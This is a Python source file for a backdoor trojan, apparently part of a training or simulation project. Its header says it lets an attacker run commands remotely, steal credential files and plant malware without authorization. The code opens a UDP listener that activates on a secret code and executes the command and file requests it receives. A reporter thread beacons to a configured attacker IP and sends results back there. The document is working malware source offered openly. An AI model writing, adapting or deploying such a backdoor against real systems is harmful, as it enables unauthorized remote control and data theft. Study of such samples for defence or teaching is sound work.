#!/usr/bin/python
#-----------------------------------------------------------------------------
# Name:        backdoorTrojan.py
#
# Purpose:     This module is used to simulate a trojan to open a backdoor to a
#              allow hacker to remote run commands, steal credential files, insert
#              malware on a host without authorize. 
#
# Author:      Yuancheng Liu
#
# Version:     v_0.1
# Created:     2023/09/21
# Copyright:   Copyright (c) 2023 LiuYuancheng
# License:     MIT License  
#-----------------------------------------------------------------------------

import os
import time
import threading
from random import randint

import udpCom
import backdoorTrojanGlobal as gv
import backdoorTrojanMgr

#-----------------------------------------------------------------------------
#-----------------------------------------------------------------------------
class trojanReporter(threading.Thread):

    def __init__(self, id, targetIP, port=gv.RPT_PORT, checkInterval=60, reportInterval=0.5) -> None:
        threading.Thread.__init__(self)
        self.trojanID = id
        self.connected = False
        self.checkInterval = checkInterval
        self.reportInterval = reportInterval
        self.client = udpCom.udpClient((targetIP, port))
        self.terminate = False

    #-----------------------------------------------------------------------------
    def run(self):
        """ Thread run() function call by start(). """
        time.sleep(1)  
        while not self.terminate:
            try:
                msg = 'RPT;Ready;%s' %str(self.trojanID)
                rqst = self.client.sendMsg(msg, resp=True)
                result = self.handlResponse(rqst)

                # send the response back to host.
                if result is None:
                    self.connected = False 
                else:
                    if result != 'accept':
                        self.client.sendMsg(result, resp=False)
                    self.connected = True
            except:
                self.connected = False
            
            if self.connected:
                time.sleep(self.reportInterval)
            else:
                time.sleep(self.checkInterval)

    #-----------------------------------------------------------------------------
    def handlResponse(self, msg):
        if gv.DEBUG_FLG: print("Response command: %s" % str(msg))
        if isinstance(msg, bytes): msg = msg.decode('utf-8') 
        # if trojan active, handle the attacker's action cmd:
        result = None
        reqKey, reqType, data = gv.iFunMgr.parseIncomeMsg(msg)
        if reqKey is None:
            return None
        elif reqKey == 'CON':
            reqType == 'accept'
            result = 'accept'
        elif reqKey == 'CMD':
            result = gv.iFunMgr.runCmd(reqType, data)
        elif reqKey == 'FIO':
            result = gv.iFunMgr.fileIO(reqType, data)
        else:
            result = 'Not support action.'
        return result

#-----------------------------------------------------------------------------
#-----------------------------------------------------------------------------
class backdoorTrojan(object):

#-----------------------------------------------------------------------------
    def __init__(self, reportMD=gv.RPT_MD) -> None:
        
        # create a random ID
        self.id = randint(1000, 2000)
        self.active = False
        self.actCode = gv.ACT_CODE

        # Init the function manager
        gv.iFunMgr = backdoorTrojanMgr.FuncManager(self)

        # Init the command receive host
        self.server = udpCom.udpServer(None, gv.UDP_PORT)
        self.server.setBufferSize(bufferSize=gv.BUF_SZ)
        # Init the reporter 
        if reportMD:
            self.reporter = trojanReporter(self.id, gv.RPT_IP, checkInterval=6)
            self.reporter.start()
            print("Trojan reportor started.")

    #-----------------------------------------------------------------------------
    def run(self):
        print("Start the backdoor trojan simulator...")
        if gv.DEBUG_FLG: print("Start the UDP echo server listening port [%s]" % gv.UDP_PORT)
        self.server.serverStart(handler=self.cmdHandler)

    #-----------------------------------------------------------------------------
    def cmdHandler(self, msg):
        """ The test handler method passed into the UDP server to handle the 
            incoming messages.
        """
        if gv.DEBUG_FLG: print("Incomming command: %s" % str(msg))
        if isinstance(msg, bytes): msg = msg.decode('utf-8')
        # handle trojan active request.
        if msg == self.actCode:
            self.active = True
            return 'ready'
        if not self.active: return None
        # if trojan active, handle the attacker's action cmd:
        result = None
        reqKey, reqType, data = gv.iFunMgr.parseIncomeMsg(msg)
        if reqKey == 'CMD':
            result = gv.iFunMgr.runCmd(reqType, data)
        elif reqKey == 'FIO':
            result = gv.iFunMgr.fileIO(reqType, data)
        else:
            result = 'Not support action.'
        return result

#-----------------------------------------------------------------------------
#-----------------------------------------------------------------------------
def main(mode):
    trojan = backdoorTrojan()
    trojan.run()

if __name__ == "__main__":
    main(0)

